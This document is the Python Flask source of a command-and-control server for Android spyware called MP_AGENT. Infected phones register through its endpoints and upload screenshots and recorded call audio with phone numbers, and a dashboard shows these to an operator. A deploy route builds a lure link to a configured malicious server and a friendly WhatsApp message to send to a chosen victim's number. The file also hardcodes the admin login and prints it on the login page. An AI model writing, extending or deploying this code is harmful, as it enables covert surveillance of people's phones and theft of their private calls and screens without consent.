from flask import Flask, request, jsonify, session, redirect, render_template, Response
import sqlite3
from datetime import datetime
import os
import requests

app = Flask(__name__)
app.secret_key = 'mp_agent_secure_key_2024_render'
app.template_folder = 'templates'

# Admin credentials
ADMIN_USERNAME = "Mpc"
ADMIN_PASSWORD = "0220Mpc"

# Dynamic server URLs - will be set from environment or request
def get_c2_url():
    return request.host_url.rstrip('/')

def get_malicious_url():
    # This will be set after deployment
    return os.environ.get('MALICIOUS_URL', '')

def get_db_connection():
    conn = sqlite3.connect('mp_agent.db')
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            session['username'] = username
            session['login_time'] = datetime.now().isoformat()
            
            # Log the login
            conn = get_db_connection()
            conn.execute(
                'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
                ('INFO', f'Admin login: {username}', datetime.now())
            )
            conn.commit()
            conn.close()
            
            return redirect('/dashboard')
        else:
            return '''
            <script>
                alert("Invalid credentials! Use: Mpc / 0220Mpc");
                window.location.href = "/login";
            </script>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MP_AGENT - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
            h2 { text-align: center; margin-bottom: 30px; color: #333; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; }
            button { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
            .credentials { margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px; text-align: center; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 MP_AGENT</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <div class="credentials">
                <strong>Username:</strong> Mpc<br>
                <strong>Password:</strong> 0220Mpc
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    
    # Get statistics
    active_agents = conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0]
    total_screenshots = conn.execute("SELECT COUNT(*) FROM screenshots").fetchall()[0][0]
    total_calls = conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0]
    total_deployments = conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
    
    # Get recent data
    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC").fetchall()
    screenshots = conn.execute('''
        SELECT s.*, a.phone_model FROM screenshots s 
        JOIN agents a ON s.agent_id = a.agent_id 
        ORDER BY s.timestamp DESC LIMIT 12
    ''').fetchall()
    
    calls = conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 10").fetchall()
    deployments = conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 10").fetchall()
    
    conn.close()
    
    c2_url = get_c2_url()
    malicious_url = get_malicious_url()
    
    return render_template('dashboard.html',
                         active_agents=active_agents,
                         total_screenshots=total_screenshots,
                         total_calls=total_calls,
                         total_deployments=total_deployments,
                         agents=agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         c2_url=c2_url,
                         malicious_url=malicious_url)

# API Endpoints for agents
@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    try:
        data = request.json
        agent_id = data.get('agent_id')
        phone_model = data.get('phone_model', 'Unknown Device')
        android_version = data.get('android_version', 'Unknown')
        ip_address = request.remote_addr
        
        conn = get_db_connection()
        
        # Check if agent exists
        existing_agent = conn.execute(
            "SELECT id FROM agents WHERE agent_id = ?", (agent_id,)
        ).fetchone()
        
        if existing_agent:
            # Update existing agent
            conn.execute(
                "UPDATE agents SET last_seen = ?, status = 'active' WHERE agent_id = ?",
                (datetime.now(), agent_id)
            )
            action = "updated"
        else:
            # Register new agent
            conn.execute('''
                INSERT INTO agents (agent_id, phone_model, android_version, ip_address, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (agent_id, phone_model, android_version, ip_address, datetime.now(), datetime.now()))
            action = "registered"
        
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            ('INFO', f'Agent {action}: {agent_id} from {ip_address}', datetime.now())
        )
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': f'Agent {action} successfully'})
        
    except Exception as e:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            ('ERROR', f'Agent registration failed: {str(e)}', datetime.now())
        )
        conn.commit()
        conn.close()
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_screenshot', methods=['POST'])
def upload_screenshot():
    try:
        agent_id = request.form.get('agent_id')
        screenshot_file = request.files.get('screenshot')
        
        if not agent_id or not screenshot_file:
            return jsonify({'status': 'error', 'message': 'Missing agent_id or screenshot'}), 400
        
        screenshot_data = screenshot_file.read()
        
        conn = get_db_connection()
        
        conn.execute(
            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
            (agent_id, screenshot_data, datetime.now())
        )
        
        conn.execute('''
            UPDATE agents 
            SET screenshot_count = screenshot_count + 1, 
                last_seen = ?,
                last_screenshot = ?
            WHERE agent_id = ?
        ''', (datetime.now(), datetime.now(), agent_id))
        
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            ('INFO', f'Screenshot uploaded from {agent_id}', datetime.now())
        )
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Screenshot uploaded successfully'})
        
    except Exception as e:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            ('ERROR', f'Screenshot upload failed: {str(e)}', datetime.now())
        )
        conn.commit()
        conn.close()
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_call', methods=['POST'])
def upload_call():
    try:
        agent_id = request.form.get('agent_id')
        call_type = request.form.get('call_type', 'unknown')
        phone_number = request.form.get('phone_number', 'unknown')
        duration = request.form.get('duration', 0)
        audio_file = request.files.get('audio')
        
        audio_data = audio_file.read() if audio_file else None
        
        conn = get_db_connection()
        
        conn.execute('''
            INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
        
        conn.execute(
            'UPDATE agents SET call_records = call_records + 1, last_seen = ? WHERE agent_id = ?',
            (datetime.now(), agent_id)
        )
        
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            ('INFO', f'Call recording from {agent_id}: {call_type} call to {phone_number}', datetime.now())
        )
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Call recording uploaded successfully'})
        
    except Exception as e:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            ('ERROR', f'Call upload failed: {str(e)}', datetime.now())
        )
        conn.commit()
        conn.close()
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Media serving endpoints
@app.route('/media/screenshot/<int:screenshot_id>')
def serve_screenshot(screenshot_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    screenshot = conn.execute(
        "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
    ).fetchone()
    conn.close()
    
    if screenshot and screenshot['screenshot_data']:
        return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
    
    return 'Screenshot not found', 404

@app.route('/media/call/<int:call_id>')
def serve_call_audio(call_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    call = conn.execute(
        "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
    ).fetchone()
    conn.close()
    
    if call and call['audio_data']:
        return Response(call['audio_data'], mimetype='audio/mp4')
    
    return 'Call recording not found', 404

# Deployment management
@app.route('/deploy', methods=['POST'])
def deploy_agent():
    if not session.get('authenticated'):
        return redirect('/login')
    
    target_phone = request.form.get('phone_number')
    agent_id = request.form.get('agent_id', f'phone_{target_phone}')
    
    malicious_url = get_malicious_url()
    if not malicious_url:
        return "Malicious server URL not configured. Please set MALICIOUS_URL environment variable.", 500
    
    malicious_link = f"{malicious_url}/video?phone={agent_id}"
    whatsapp_message = f"Check this out! 😊 {malicious_link}"
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (target_phone, session.get('username', 'admin'), whatsapp_message, 'initiated', datetime.now())
    )
    
    conn.execute(
        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
        ('INFO', f'Deployment created for {target_phone} -> {agent_id}', datetime.now())
    )
    
    conn.commit()
    conn.close()
    
    return render_template('deployment.html', 
                         target_phone=target_phone,
                         agent_id=agent_id,
                         malicious_link=malicious_link,
                         whatsapp_message=whatsapp_message)

@app.route('/logout')
def logout():
    username = session.get('username', 'Unknown')
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
        ('INFO', f'Admin logout: {username}', datetime.now())
    )
    conn.commit()
    conn.close()
    
    session.clear()
    return redirect('/login')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)